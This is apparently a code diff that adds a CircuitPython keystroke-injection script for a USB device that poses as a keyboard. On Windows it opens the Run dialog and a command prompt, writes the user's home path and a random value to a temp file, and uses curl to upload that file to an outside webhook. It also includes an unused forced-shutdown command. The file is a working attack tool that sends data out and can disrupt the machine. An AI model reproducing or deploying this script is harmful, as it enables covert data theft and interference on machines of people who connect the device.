@@ -1,0 +1,48 @@
+import usb_hid
+from adafruit_hid.mouse import Mouse
+from adafruit_hid.keyboard import Keyboard
+from adafruit_hid.keycode import Keycode
+from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
+import time
+
+def open_cmd():
+    keyboard.send(Keycode.GUI, Keycode.R)
+    time.sleep(1)
+
+    layout.write('cmd')
+    keyboard.send(Keycode.ENTER)
+
+def echo_to_file(data, name, overwrite=None):
+    mode = ' > '
+    if overwrite:
+        mode = ' >> '
+    layout.write('echo ' + data + mode + name)
+    keyboard.send(Keycode.ENTER)
+
+
+def send_to_webhook(file_path):
+    layout.write('curl -X POST -F "file=@' + file_path + '" http://tinypablo.eu:33003/webhook')
+    keyboard.send(Keycode.ENTER)
+
+def shutdown():
+    layout.write('shutdown /s /f /t 0')
+    keyboard.send(Keycode.ENTER)
+
+    
+mouse = Mouse(usb_hid.devices)
+keyboard = Keyboard(usb_hid.devices)
+layout = KeyboardLayoutUS(keyboard)
+
+file_path = '%temp%\data.txt'
+
+time.sleep(2)
+
+open_cmd()
+
+time.sleep(1)
+
+echo_to_file('%homepath%', file_path)
+
+echo_to_file('%random%', file_path, True)
+
+send_to_webhook(file_path)
